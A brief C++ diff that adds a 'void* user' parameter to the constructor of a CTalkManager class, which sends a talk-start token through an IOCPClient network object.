@@ -27,7 +27,7 @@ IOCPClient* g_IOCPClientObject = NULL;
 
 extern HINSTANCE 	g_hInstance;
 
-CTalkManager::CTalkManager(IOCPClient* ClientObject, int n):CManager(ClientObject)
+CTalkManager::CTalkManager(IOCPClient* ClientObject, int n, void* user):CManager(ClientObject)
 {
 	BYTE	bToken = TOKEN_TALK_START;      //包含头文件 Common.h     
 	m_ClientObject->OnServerSending((char*)&bToken, 1);
